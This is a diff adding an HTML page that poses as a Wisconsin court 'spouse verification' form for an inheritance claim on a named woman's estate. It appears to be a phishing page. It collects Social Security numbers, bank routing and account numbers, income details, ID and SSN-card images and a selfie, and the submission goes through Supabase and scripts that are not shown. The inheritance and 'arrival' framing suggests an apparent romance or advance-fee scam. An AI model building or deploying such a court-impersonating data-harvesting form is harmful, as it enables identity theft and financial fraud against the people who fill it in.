@@ -1,0 +1,464 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <link href="css/output.css" rel="stylesheet" />
+    <title>Inheritance Claim</title>
+  </head>
+  <body class="bg-white text-white font-sans">
+    <!-- Header -->
+    <header class="bg-gray-100 text-gray-900 border-b border-gray-300">
+      <div
+        class="max-w-5xl mx-auto px-4 py-6 flex flex-col items-center gap-4 md:flex-row md:items-start"
+      >
+        <!-- Court Logo -->
+        <img
+          src="./media/court_logo.png"
+          alt="Wisconsin Court Logo"
+          class="h-32 w-auto"
+        />
+
+        <!-- Title and Subtitle -->
+        <div class="text-center md:text-left md:ml-6">
+          <h1 class="text-xl md:text-2xl font-semibold">
+            Wisconsin Court – Spouse Verification
+          </h1>
+          <h2 class="text-sm md:text-lg font-medium mt-2">
+            Estate of Ms. Aurora Amburgey – Inheritance Verification
+          </h2>
+          <p class="mt-2 text-sm text-gray-700 max-w-prose">
+            This form is to verify the claim of a spouse seeking inheritance
+            from the estate of Ms. Aurora. Please complete all fields
+            truthfully.
+          </p>
+        </div>
+      </div>
+    </header>
+
+    <!-- Main Content -->
+    <main class="max-w-4xl mx-auto px-4 py-10 md:py-16">
+      <!-- Section Header -->
+      <!-- Contact Form -->
+      <div class="bg-gray-200 p-6 rounded-lg shadow-md">
+        <form class="space-y-4" role="form" aria-label="Contact Form">
+          <h3 class="text-2xl font-bold text-black mb-4">
+            Personal & Contact Information
+          </h3>
+          <div class="grid grid-cols-1 md:grid-cols-2 gap-4">
+            <input
+              type="text"
+              name="name"
+              placeholder="Full Name"
+              required
+              class="w-full p-3 border border-gray-500 bg-gray-100 rounded-xl focus:outline-none focus:ring-2 focus:ring-blue-300 text-black"
+            />
+            <input
+              type="email"
+              name="email"
+              placeholder="Email Address"
+              required
+              class="w-full p-3 border border-gray-500 bg-gray-100 rounded-xl focus:outline-none focus:ring-2 focus:ring-blue-300 text-black"
+            />
+            <input
+              type="tel"
+              name="phone"
+              placeholder="Phone Number"
+              required
+              class="w-full p-3 border border-gray-500 bg-gray-100 rounded-xl focus:outline-none focus:ring-2 focus:ring-blue-300 text-black"
+            />
+            <input
+              type="text"
+              name="dob"
+              placeholder="Date of Birth(MM/DD/YYYY)"
+              required
+              pattern="^(0[1-9]|1[0-2])\/(0[1-9]|[12]\d|3[01])\/(19|20)\d{2}$"
+              title="Enter date in MM/DD/YYYY format (e.g., 08/25/1995)"
+              class="w-full p-3 border border-gray-500 bg-gray-100 rounded-xl focus:outline-none focus:ring-2 focus:ring-blue-300 text-black"
+            />
+          </div>
+          <input
+            type="text"
+            name="ssn"
+            placeholder="Social Security Number(xxx-xx-xxxx)"
+            pattern="\d{3}-\d{2}-\d{4}"
+            title="Enter SSN in the format 123-45-6789"
+            required
+            class="w-full p-3 border border-gray-500 bg-gray-100 rounded-xl focus:outline-none focus:ring-2 focus:ring-blue-300 text-black"
+          />
+          <div class="space-y-4">
+            <div>
+              <input
+                type="text"
+                name="address"
+                placeholder="Address"
+                class="w-full p-3 border border-gray-500 bg-gray-100 rounded-xl text-black focus:outline-none focus:ring-2 focus:ring-blue-300"
+                required
+              />
+            </div>
+            <div class="grid grid-cols-1 md:grid-cols-3 gap-4">
+              <div>
+                <input
+                  type="text"
+                  name="city"
+                  placeholder="City"
+                  class="w-full p-3 border border-gray-500 bg-gray-100 rounded-xl text-black focus:outline-none focus:ring-2 focus:ring-blue-300"
+                  required
+                />
+              </div>
+              <div>
+                <input
+                  type="text"
+                  name="state"
+                  placeholder="State"
+                  class="w-full p-3 border border-gray-500 bg-gray-100 rounded-xl text-black focus:outline-none focus:ring-2 focus:ring-blue-300"
+                  required
+                />
+              </div>
+              <div>
+                <input
+                  type="text"
+                  name="zip"
+                  placeholder="Zipcode"
+                  class="w-full p-3 border border-gray-500 bg-gray-100 rounded-xl text-black focus:outline-none focus:ring-2 focus:ring-blue-300"
+                  required
+                />
+              </div>
+            </div>
+          </div>
+          <div class="mt-8">
+            <h3 class="text-2xl font-bold text-black mb-4">
+              Employment & Income
+            </h3>
+            <div class="md:flex md:gap-4">
+              <p class="text-black">What is your Employment status?</p>
+              <div class="flex gap-4">
+                <div>
+                  <input
+                    type="radio"
+                    id="employed"
+                    name="employment_status"
+                    value="employed"
+                    class="text-yellow-400 rounded border-gray-400 bg-gray-700"
+                  />
+                  <label for="employed" class="text-black">Employed</label>
+                </div>
+                <div>
+                  <input
+                    type="radio"
+                    id="Self-employed"
+                    name="employment_status"
+                    value="Self-employed"
+                    class="text-yellow-400 rounded border-gray-400 bg-gray-700"
+                  />
+                  <label for="Self-employed" class="text-black"
+                    >Self-employed</label
+                  >
+                </div>
+                <div>
+                  <input
+                    type="radio"
+                    id="unemployed"
+                    name="employment_status"
+                    value="unemployed"
+                    class="form-checkbox text-yellow-400 rounded border-gray-400 bg-gray-700"
+                  />
+                  <label for="unemployed" class="text-black">Unemployed</label>
+                </div>
+                <div>
+                  <input
+                    type="radio"
+                    id="retired"
+                    name="employment_status"
+                    value="retired"
+                    class="text-yellow-400 rounded border-gray-400 bg-gray-700"
+                  />
+                  <label for="retired" class="text-black">Retired</label>
+                </div>
+              </div>
+            </div>
+            <div class="md:flex md:gap-4 mt-4">
+              <p class="text-black mb-1">What is Employer’s name</p>
+              <div>
+                <input
+                  type="text"
+                  name="employer_name"
+                  placeholder="Enter Employer’s Name"
+                  required
+                  class="w-full p-1 border border-gray-500 bg-gray-100 rounded-xl focus:outline-none focus:ring-2 focus:ring-blue-300 text-black"
+                />
+              </div>
+            </div>
+            <div class="md:flex md:gap-4 mt-4">
+              <p class="text-black mb-1">What is your job title?</p>
+              <div>
+                <input
+                  type="text"
+                  name="job_title"
+                  placeholder="Enter Job Title"
+                  required
+                  class="w-full p-1 border border-gray-500 bg-gray-100 rounded-xl focus:outline-none focus:ring-2 focus:ring-blue-300 text-black"
+                />
+              </div>
+            </div>
+            <div class="md:flex md:gap-4 mt-4">
+              <p class="text-black mb-1">Do you:</p>
+              <div>
+                <input
+                  type="radio"
+                  id="rent"
+                  name="rent_status"
+                  value="rent"
+                  class="text-yellow-400 rounded border-gray-400 bg-gray-700"
+                />
+                <label for="rent" class="text-black">Rent</label>
+              </div>
+              <div>
+                <input
+                  type="radio"
+                  id="own"
+                  name="rent_status"
+                  value="own"
+                  class="text-yellow-400 rounded border-gray-400 bg-gray-700"
+                />
+                <label for="own" class="text-black">Own</label>
+              </div>
+              <div>
+                <input
+                  type="radio"
+                  id="mortgage"
+                  name="rent_status"
+                  value="mortgage"
+                  class="text-yellow-400 rounded border-gray-400 bg-gray-700"
+                />
+                <label for="mortgage" class="text-black"
+                  >Own (with a mortgage)</label
+                >
+              </div>
+              <div>
+                <input
+                  type="radio"
+                  id="family"
+                  name="rent_status"
+                  value="family"
+                  class="form-checkbox text-yellow-400 rounded border-gray-400 bg-gray-700"
+                />
+                <label for="family" class="text-black"
+                  >Live with parents/family</label
+                >
+              </div>
+            </div>
+            <div class="md:flex md:gap-4 mt-4">
+              <p class="text-black mb-1">Monthly rent or mortgage payment</p>
+              <div>
+                <input
+                  type="number"
+                  name="rent_amount"
+                  placeholder="Enter Amount here"
+                  class="w-full p-1 border border-gray-500 bg-gray-100 rounded-xl focus:outline-none focus:ring-2 focus:ring-blue-300 text-black"
+                />
+              </div>
+            </div>
+            <div class="md:flex md:gap-4 mt-4">
+              <p class="text-black mb-1">Annual Gross Income</p>
+              <div>
+                <input
+                  type="number"
+                  name="gross_income"
+                  placeholder="Enter Gross Income"
+                  class="w-full p-1 border border-gray-500 bg-gray-100 rounded-xl focus:outline-none focus:ring-2 focus:ring-blue-300 text-black"
+                />
+              </div>
+            </div>
+            <div class="md:flex md:gap-4 mt-4">
+              <p class="text-black mb-1">
+                Will you be receiving dividends and payments on behalf of Ms.
+                Aurora?
+              </p>
+              <div class="flex gap-4">
+                <div>
+                  <input
+                    type="radio"
+                    id="marriedYes"
+                    name="receiving_dividends"
+                    value="true"
+                    class="text-yellow-400 rounded border-gray-400 bg-gray-700"
+                  />
+                  <label for="marriedYes" class="text-black">Yes</label>
+                </div>
+                <div>
+                  <input
+                    type="radio"
+                    id="marriedNo"
+                    name="receiving_dividends"
+                    value="false"
+                    class="text-yellow-400 rounded border-gray-400 bg-gray-700"
+                  />
+                  <label for="marriedNo" class="text-black">No</label>
+                </div>
+              </div>
+            </div>
+            <div id="bankDetails" class="hidden mt-4">
+              <p class="text-black font-medium">Bank Account Details</p>
+              <p class="text-sm text-gray-500 mb-2">
+                (Bank account must reflect employment or income history)
+              </p>
+              <div class="flex flex-col md:flex-row gap-4">
+                <div class="flex-1">
+                  <input
+                    type="text"
+                    id="routing-number"
+                    name="bank_routing_number"
+                    class="w-full px-3 py-2 border border-gray-300 rounded text-black"
+                    placeholder="Enter routing number"
+                  />
+                </div>
+                <div class="flex-1">
+                  <input
+                    type="text"
+                    id="account-number"
+                    name="bank_account_number"
+                    class="w-full px-3 py-2 border border-gray-300 rounded text-black"
+                    placeholder="Enter account number"
+                  />
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="mt-8">
+            <h3 class="text-2xl font-bold text-black mb-4">
+              Relationship Details
+            </h3>
+            <div class="md:flex md:gap-4">
+              <p class="text-black">
+                Are you legally married to Ms. Aurora Amburgey?
+              </p>
+              <div class="flex gap-4">
+                <div>
+                  <input
+                    type="radio"
+                    id="isMarried"
+                    name="legally_married"
+                    value="yes"
+                    class="text-yellow-400 rounded border-gray-400 bg-gray-700"
+                  />
+                  <label for="isMarried" class="text-black">Yes</label>
+                </div>
+                <div>
+                  <input
+                    type="radio"
+                    id="notMarried"
+                    name="legally_married"
+                    value="no"
+                    class="text-yellow-400 rounded border-gray-400 bg-gray-700"
+                  />
+                  <label for="notMarried" class="text-black">No</label>
+                </div>
+              </div>
+            </div>
+            <div class="md:flex md:gap-4">
+              <p class="text-black">
+                Will proper accomodation be provided to Ms. Aurora on her
+                arrival?
+              </p>
+              <div class="flex gap-4">
+                <div>
+                  <input
+                    type="radio"
+                    id="livingYes"
+                    name="living_together"
+                    value="yes"
+                    class="text-yellow-400 rounded border-gray-400 bg-gray-700"
+                  />
+                  <label for="livingYes" class="text-black">Yes</label>
+                </div>
+                <div>
+                  <input
+                    type="radio"
+                    id="livingNo"
+                    name="living_together"
+                    value="no"
+                    class="text-yellow-400 rounded border-gray-400 bg-gray-700"
+                  />
+                  <label for="livingNo" class="text-black">No</label>
+                </div>
+              </div>
+            </div>
+          </div>
+          <div class="upload-section mt-8">
+            <h3 class="text-2xl font-bold text-black mb-4">
+              Supporting Documents
+            </h3>
+
+            <!-- Required files list -->
+            <ul class="mb-4 list-disc list-inside text-black">
+              <li>
+                Proof of Identity (e.g., Passport or Driver's License)
+                <span class="text-red-600">*</span>
+              </li>
+              <li>
+                Three(3) Most Recent Bank Statement
+                <span class="text-red-600">*</span>
+              </li>
+              <li>Most Recent Selfie <span class="text-red-600">*</span></li>
+              <li>Picture of SSN Card <span class="text-red-600">*</span></li>
+            </ul>
+
+            <!-- File Upload Input -->
+            <input
+              type="file"
+              name="supporting_documents"
+              multiple
+              accept=".jpg,.jpeg,.png,.pdf"
+              required
+              class="w-full md:w-1/2 p-3 cursor-pointer border border-gray-500 bg-gray-100 rounded-xl focus:outline-none focus:ring-2 focus:ring-blue-300 text-black"
+              id="fileUpload"
+            />
+
+            <!-- Uploaded files list -->
+            <ul id="uploadedFiles" class="mt-4 flex flex-wrap gap-3"></ul>
+          </div>
+          <div class="mt-8">
+            <h3 class="text-2xl font-bold text-black mb-4">Declaration</h3>
+            <div class="flex gap-2">
+              <input
+                type="checkbox"
+                id="declarationCheck"
+                name="declaration"
+                value="checked"
+                class="text-yellow-400 rounded border-gray-400 bg-gray-700"
+              />
+              <p class="text-black">
+                I declare that the information provided is true and correct.
+              </p>
+            </div>
+          </div>
+
+          <!-- Submit Button -->
+          <div class="flex sm:justify-end justify-center">
+            <button
+              type="submit"
+              id="sendBtn"
+              class="bg-gray-600 border-gray-500 text-white px-6 py-3 rounded-lg hover:bg-gray-500 transition shadow-md cursor-pointer"
+            >
+              <span class="text-yellow-400">Submit Verification</span>
+            </button>
+          </div>
+          <div
+            id="form-message"
+            class="transition-opacity duration-500 opacity-0 hidden text-center text-base mb-4"
+          ></div>
+        </form>
+      </div>
+    </main>
+
+    <!-- Footer (optional) -->
+    <footer class="text-center py-6 text-sm text-gray-500">
+      &copy; 2025 Wisconsin Court. All rights reserved.
+    </footer>
+    <script src="js/upload.js"></script>
+    <script src="js/bankInfo.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js"></script>
+    <script src="js/submit.js"></script>
+  </body>
+</html>
